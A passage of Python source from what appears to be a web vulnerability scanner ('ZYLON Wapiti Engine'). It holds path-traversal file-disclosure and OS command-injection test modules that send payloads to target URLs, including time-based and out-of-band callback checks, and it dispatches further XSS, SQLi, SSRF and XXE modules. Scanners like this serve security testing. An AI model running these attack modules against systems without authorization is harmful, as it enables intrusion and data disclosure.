            for file_path in FILE_DISCLOSURE_PATHS[:8]:
                # Try multiple traversal depths
                for depth in ['', '../', '../../', '../../../']:
                    results["total_tested"] += 1
                    test_payload = f"{depth}{file_path}"
                    try:
                        if method == 'GET':
                            resp = self.session.get(url, params={param: test_payload}, timeout=self.timeout)
                        else:
                            resp = self.session.post(url, data={param: test_payload}, timeout=self.timeout)

                        if resp:
                            for indicator in file_indicators:
                                if indicator in resp.text:
                                    vuln = {
                                        "url": url,
                                        "method": method,
                                        "parameter": param,
                                        "payload": test_payload,
                                        "evidence": f"File indicator '{indicator}' found in response",
                                        "severity": "critical",
                                        "type": "File Disclosure",
                                    }
                                    results["vulnerable"].append(vuln)
                                    self.findings.append(vuln)
                                    self._log(f"  {R}[LFI] {url} param='{param}' file='{test_payload}'{RESET}", R)
                                    break
                    except Exception:
                        continue

        results["total_vulnerable"] = len(results["vulnerable"])
        self._log(f"File disclosure test complete: {results['total_vulnerable']} vulnerabilities found",
                  G if not results["vulnerable"] else R)
        return results

    # ========================================================================
    # ATTACK MODULE: COMMAND INJECTION
    # ========================================================================

    def test_cmd_injection(self, urls=None):
        """Command injection module - test for OS command injection"""
        targets = urls or list(self.crawled_urls)
        if not targets:
            self.crawl()
            targets = list(self.crawled_urls)

        self._log(f"Testing Command Injection on {len(targets)} URLs ({len(CMD_INJECTION_PAYLOADS)} payloads)", C)

        results = {
            "vulnerable": [],
            "total_tested": 0,
            "total_vulnerable": 0,
            "scan_type": "cmd_injection",
            "timestamp": datetime.now().isoformat(),
        }

        cmd_params = ['cmd', 'exec', 'command', 'action', 'run', 'execute',
                      'ping', 'host', 'ip', 'domain', 'name', 'user', 'query']

        test_points = []
        for url in targets:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in cmd_params or any(p in param.lower() for p in ['cmd', 'exec', 'ping', 'host', 'ip']):
                    test_points.append((url, 'GET', param))

        for form in self.forms:
            for inp in form.get('inputs', []):
                if inp.get('name', '').lower() in cmd_params:
                    test_points.append((form['action'], form['method'], inp['name']))

        if not test_points:
            base_url = self._get_base_url()
            for param in ['cmd', 'ip', 'host', 'ping']:
                test_points.append((f"{base_url}/?{param}=test", 'GET', param))

        # Generate OOB callback host for payloads that reference {oob_host}
        oob_pid = oob_provider.generate_payload_id()
        oob_host = oob_provider.get_callback_domain(oob_pid)

        for url, method, param in test_points[:20]:
            for payload_template in CMD_INJECTION_PAYLOADS:
                results["total_tested"] += 1
                try:
                    # Format OOB host placeholders via oob_provider
                    try:
                        payload = payload_template.format(oob_host=oob_host)
                    except (KeyError, IndexError):
                        payload = payload_template
                    start_time = time.time()
                    if method == 'GET':
                        resp = self.session.get(url, params={param: payload}, timeout=self.timeout + 5)
                    else:
                        resp = self.session.post(url, data={param: payload}, timeout=self.timeout + 5)
                        # Also try JSON body injection via PayloadInjector for POST
                        try:
                            json_injection = PayloadInjector.inject_json(url, param, payload)
                            self.session.post(json_injection['url'], json=json_injection['json'],
                                            headers=json_injection.get('headers', {}),
                                            timeout=self.timeout + 5, allow_redirects=False)
                        except Exception:
                            pass
                    elapsed = time.time() - start_time

                    if resp:
                        # Check for command output indicators
                        for marker in CMD_INJECTION_MARKERS:
                            if marker in resp.text:
                                vuln = {
                                    "url": url,
                                    "method": method,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": f"Command marker '{marker}' found in response",
                                    "severity": "critical",
                                    "type": "Command Injection",
                                }
                                results["vulnerable"].append(vuln)
                                self.findings.append(vuln)
                                self._log(f"  {R}[CMDi] {url} param='{param}' payload='{payload}' marker='{marker}'{RESET}", R)
                                break

                        # Check for time-based command injection
                        if 'sleep' in payload and elapsed >= 2.5:
                            vuln = {
                                "url": url,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Time-based: {elapsed:.1f}s response time",
                                "severity": "critical",
                                "type": "Command Injection (Blind)",
                            }
                            results["vulnerable"].append(vuln)
                            self.findings.append(vuln)
                            self._log(f"  {R}[CMDi] {url} param='{param}' - TIME-BASED {elapsed:.1f}s{RESET}", R)

                except Exception:
                    continue

        results["total_vulnerable"] = len(results["vulnerable"])
        self._log(f"Command injection test complete: {results['total_vulnerable']} vulnerabilities found",
                  G if not results["vulnerable"] else R)
        return results

    # ========================================================================
    # REPORT GENERATION
    # ========================================================================

    def generate_report(self):
        """Generate vulnerability report"""
        report = {
            "target": self._get_base_url(),
            "scan_date": datetime.now().isoformat(),
            "intensity": self.intensity,
            "total_findings": len(self.findings),
            "findings_by_type": {},
            "findings": self.findings,
            "crawled_urls": len(self.crawled_urls),
            "forms_found": len(self.forms),
        }

        # Group by type
        for finding in self.findings:
            vuln_type = finding.get('type', 'Unknown')
            if vuln_type not in report["findings_by_type"]:
                report["findings_by_type"][vuln_type] = 0
            report["findings_by_type"][vuln_type] += 1

        # Export
        try:
            import os
            os.makedirs(self.output_dir, exist_ok=True)
            filename = os.path.join(self.output_dir,
                                     f"wapiti_report_{self.target}_{int(time.time())}.json")
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            self._log(f"Report exported to {filename}", G)
        except Exception as e:
            self._log(f"Report export failed: {e}", R)

        return report

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """Main entry point for Wapiti engine

        Args:
            target: Target URL or domain
            scan_type: One of 'xss', 'sqli', 'ssrf', 'xxe', 'crlf',
                       'file_disclosure', 'cmd_injection', 'full'
            **kwargs: Additional options (cookies, auth, intensity, proxy, threads)

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self.target = target
        self.cookies = kwargs.get('cookies', self.cookies)
        self.auth = kwargs.get('auth', self.auth)
        self.intensity = kwargs.get('intensity', self.intensity)
        self.threads = kwargs.get('threads', self.threads)

        self._log(f"{BOLD}═══ ZYLON Wapiti Engine v5.0 ═══{RESET}", M)
        self._log(f"Target: {target} | Scan: {scan_type} | Intensity: {self.intensity}", Y)

        scan_results = {}
        all_findings = []

        try:
            if scan_type == 'xss':
                scan_results = self.test_xss()
            elif scan_type == 'sqli':
                scan_results = self.test_sqli()
            elif scan_type == 'ssrf':
                scan_results = self.test_ssrf()
            elif scan_type == 'xxe':
                scan_results = self.test_xxe()
            elif scan_type == 'crlf':
                scan_results = self.test_crlf()
            elif scan_type == 'file_disclosure':
                scan_results = self.test_file_disclosure()
            elif scan_type == 'cmd_injection':
                scan_results = self.test_cmd_injection()
            elif scan_type == 'full':
                # Run all modules
                self._log(f"{BOLD}Running FULL scan (all modules)...{RESET}", M)
                crawl_result = self.crawl(target)

                scan_results = {
                    "crawl": crawl_result,
                    "modules": {},
                }

                modules = [
                    ('XSS', self.test_xss),
                    ('SQLi', self.test_sqli),
                    ('SSRF', self.test_ssrf),
                    ('XXE', self.test_xxe),
                    ('CRLF', self.test_crlf),
                    ('File Disclosure', self.test_file_disclosure),
                    ('Command Injection', self.test_cmd_injection),
                ]

                for module_name, module_func in modules:
                    self._log(f"Running module: {module_name}", C)
                    try:
                        module_result = module_func()
                        scan_results["modules"][module_name] = module_result
                        all_findings.extend(module_result.get("vulnerable", []))
                    except Exception as e:
                        self._log(f"Module {module_name} failed: {e}", R)
                        scan_results["modules"][module_name] = {"error": str(e)}

                # Generate report
                report = self.generate_report()
                scan_results["report"] = report
            else:
                scan_results = {"error": f"Unknown scan type: {scan_type}"}

        except Exception as e:
            self._log(f"Scan error: {e}", R)
            scan_results["error"] = str(e)

        # Build return format
        vulnerable = len(all_findings) > 0 if all_findings else scan_results.get("total_vulnerable", 0) > 0

        return {
            "vulnerable": vulnerable,
            "findings": all_findings if all_findings else scan_results.get("vulnerable", []),
            "details": scan_results,
            "scan_type": f"wapiti_{scan_type}",
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION (for ZYLON integration)
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level run function for ZYLON integration"""
    engine = WapitiEngine(target=target, **kwargs)
    return engine.run(target, scan_type=scan_type, **kwargs)


# ============================================================================
# OS IMPORT (needed for report generation)
# ============================================================================

import os
